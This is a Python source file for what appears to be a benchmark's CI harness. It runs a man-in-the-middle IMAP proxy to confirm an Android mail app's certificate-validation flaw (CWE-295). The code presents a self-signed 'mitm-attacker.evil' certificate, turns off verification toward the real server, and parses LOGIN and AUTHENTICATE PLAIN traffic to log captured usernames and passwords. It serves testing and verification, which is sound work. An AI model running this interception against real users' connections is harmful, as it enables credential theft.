#!/usr/bin/env python3
"""CI-controlled challenge MITM IMAP proxy for CWE-295 verification.

Started by run_ci_local.sh BEFORE the exploit container runs.  The exploit
container never controls this server, its certificates, or the traffic it
relays.  prepare_app.sh redirects the app's IMAP connection to this proxy
(via SQLite DB modification + ADB reverse tunnel).

The proxy presents a self-signed certificate that is NOT trusted by the
system CA store.  On the vulnerable app (checkServerTrusted is a no-op),
the TLS handshake succeeds and the proxy captures IMAP credentials.  On
the clean app, the TLS handshake fails because the certificate is rejected.

The verifier (verify_exploit.sh) checks:
  1. This server's log shows a TLS connection from 127.0.0.1 (the emulator
     via ADB reverse tunnel).  Connections from the exploit container would
     appear as a Docker bridge IP (172.17.x.x).
  2. IMAP credentials were captured through the proxy, proving the app
     completed authentication over the untrusted TLS channel.

The SESSION_TOKEN is a UUID generated fresh on each server startup and
written only to the CI-controlled CHALLENGE_LOG_FILE — it serves as an
infrastructure integrity canary.
"""

import argparse
import base64
import os
import re
import select
import socket
import ssl
import subprocess
import sys
import threading
import uuid
from datetime import datetime, timezone

SESSION_TOKEN = str(uuid.uuid4())


def log(msg):
    print(f"[challenge_server] {msg}", file=sys.stderr, flush=True)


def generate_self_signed_cert(tmpdir):
    """Generate a self-signed cert for MITM interception."""
    cert_file = os.path.join(tmpdir, "mitm-cert.pem")
    key_file = os.path.join(tmpdir, "mitm-key.pem")
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-keyout",
            key_file,
            "-out",
            cert_file,
            "-days",
            "1",
            "-nodes",
            "-subj",
            "/CN=mitm-attacker.evil",
        ],
        check=True,
        capture_output=True,
    )
    log("Generated self-signed certificate")
    return cert_file, key_file


def write_log(log_file, entry):
    """Append a line to the challenge log file."""
    with open(log_file, "a") as f:
        f.write(entry + "\n")


def decode_plain_auth(b64_string):
    """Decode SASL PLAIN base64 payload: \\x00username\\x00password."""
    try:
        decoded = base64.b64decode(b64_string)
        parts = decoded.split(b"\x00")
        if len(parts) >= 3:
            username = parts[1].decode("utf-8", errors="replace")
            password = parts[2].decode("utf-8", errors="replace")
            if username and password:
                return username, password
    except Exception:
        pass
    return None, None


def parse_client_data(data, conn_id, client_ip, log_file):
    """Parse IMAP client data for LOGIN and AUTHENTICATE PLAIN credentials."""
    try:
        text = data.decode("utf-8", errors="replace")
    except Exception:
        return
    for line in text.splitlines():
        match = re.match(
            r'^[A-Za-z0-9]+\s+LOGIN\s+"?([^"\s]+)"?\s+"?([^"\s]+)"?',
            line,
            re.IGNORECASE,
        )
        if match:
            username, password = match.group(1), match.group(2)
            ts = datetime.now(timezone.utc).isoformat()
            write_log(log_file, f"CREDENTIALS:{client_ip}:{username}:{password}:{ts}")
            log(f"CAPTURED credentials from {client_ip}: {username} (conn {conn_id})")
            continue

        match = re.match(
            r"^[A-Za-z0-9]+\s+AUTHENTICATE\s+PLAIN\s+(.+)",
            line,
            re.IGNORECASE,
        )
        if match:
            username, password = decode_plain_auth(match.group(1).strip())
            if username and password:
                ts = datetime.now(timezone.utc).isoformat()
                write_log(
                    log_file,
                    f"CREDENTIALS:{client_ip}:{username}:{password}:{ts}",
                )
                log(
                    f"CAPTURED credentials from {client_ip}: {username} (conn {conn_id})"
                )
            continue

        stripped = line.strip()
        if (
            stripped
            and not stripped.startswith("*")
            and not stripped.startswith("+")
            and re.fullmatch(r"[A-Za-z0-9+/=]+", stripped)
        ):
            username, password = decode_plain_auth(stripped)
            if username and password:
                ts = datetime.now(timezone.utc).isoformat()
                write_log(
                    log_file,
                    f"CREDENTIALS:{client_ip}:{username}:{password}:{ts}",
                )
                log(
                    f"CAPTURED credentials from {client_ip}: {username} (conn {conn_id})"
                )


def relay(src, dst, direction, conn_id, client_ip, log_file):
    """Relay data between two sockets, capturing client-to-server traffic."""
    buf = b""
    try:
        while True:
            ready, _, _ = select.select([src], [], [], 30)
            if not ready:
                continue
            data = src.recv(8192)
            if not data:
                break
            if direction == "client_to_server":
                buf += data
                parse_client_data(buf, conn_id, client_ip, log_file)
                buf = b""
            dst.sendall(data)
    except (ConnectionResetError, BrokenPipeError, ssl.SSLError, OSError):
        pass


def handle_client(
    client_sock, client_addr, server_ctx, conn_id, real_host, real_port, log_file
):
    """Handle one proxied IMAP connection."""
    client_ip = client_addr[0]
    ts = datetime.now(timezone.utc).isoformat()
    write_log(log_file, f"CONNECTED:{client_ip}:{ts}")
    log(f"Connection {conn_id} from {client_ip}")

    backend_sock = None
    try:
        raw_backend = socket.create_connection((real_host, real_port), timeout=10)
        backend_sock = server_ctx.wrap_socket(raw_backend, server_hostname=real_host)

        t1 = threading.Thread(
            target=relay,
            args=(
                client_sock,
                backend_sock,
                "client_to_server",
                conn_id,
                client_ip,
                log_file,
            ),
            daemon=True,
        )
        t2 = threading.Thread(
            target=relay,
            args=(backend_sock, client_sock, "server_to_client", conn_id, "", ""),
            daemon=True,
        )
        t1.start()
        t2.start()
        t1.join()
        t2.join(timeout=5)
    except Exception as e:
        log(f"Connection {conn_id} error: {e}")
    finally:
        try:
            client_sock.close()
        except Exception:
            pass
        if backend_sock:
            try:
                backend_sock.close()
            except Exception:
                pass
    log(f"Connection {conn_id} closed")


def main():
    parser = argparse.ArgumentParser(
        description="CI-controlled challenge MITM IMAP proxy for CWE-295"
    )
    parser.add_argument("--port", type=int, required=True, help="Port to listen on")
    parser.add_argument(
        "--log-file", required=True, help="Path to write connection/credential log"
    )
    parser.add_argument(
        "--real-imap-host",
        default="localhost",
        help="Real IMAP server host (default: localhost)",
    )
    parser.add_argument(
        "--real-imap-port",
        type=int,
        default=993,
        help="Real IMAP server port (default: 993)",
    )
    args = parser.parse_args()

    import tempfile

    tmpdir = tempfile.mkdtemp()
    cert_file, key_file = generate_self_signed_cert(tmpdir)

    write_log(args.log_file, f"SESSION_TOKEN:{SESSION_TOKEN}")
    log(f"Session token: {SESSION_TOKEN}")

    mitm_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    mitm_ctx.load_cert_chain(cert_file, key_file)

    server_ctx = ssl.create_default_context()
    server_ctx.check_hostname = False
    server_ctx.verify_mode = ssl.CERT_NONE

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("0.0.0.0", args.port))
    listener.listen(5)

    canonical_url = f"imaps://127.0.0.1:{args.port}"
    log(
        f"IMAPS MITM listening on port {args.port}, "
        f"forwarding to {args.real_imap_host}:{args.real_imap_port}"
    )
    print(f"[READY] {canonical_url}", file=sys.stderr, flush=True)

    conn_id = 0
    while True:
        try:
            raw_client, addr = listener.accept()
            client_sock = mitm_ctx.wrap_socket(raw_client, server_side=True)
            conn_id += 1
            threading.Thread(
                target=handle_client,
                args=(
                    client_sock,
                    addr,
                    server_ctx,
                    conn_id,
                    args.real_imap_host,
                    args.real_imap_port,
                    args.log_file,
                ),
                daemon=True,
            ).start()
        except ssl.SSLError as e:
            log(f"TLS handshake rejected: {e}")
            ts = datetime.now(timezone.utc).isoformat()
            client_ip = addr[0] if addr else "unknown"
            write_log(args.log_file, f"TLS_REJECTED:{client_ip}:{ts}")
        except Exception as e:
            log(f"Accept error: {e}")


if __name__ == "__main__":
    main()
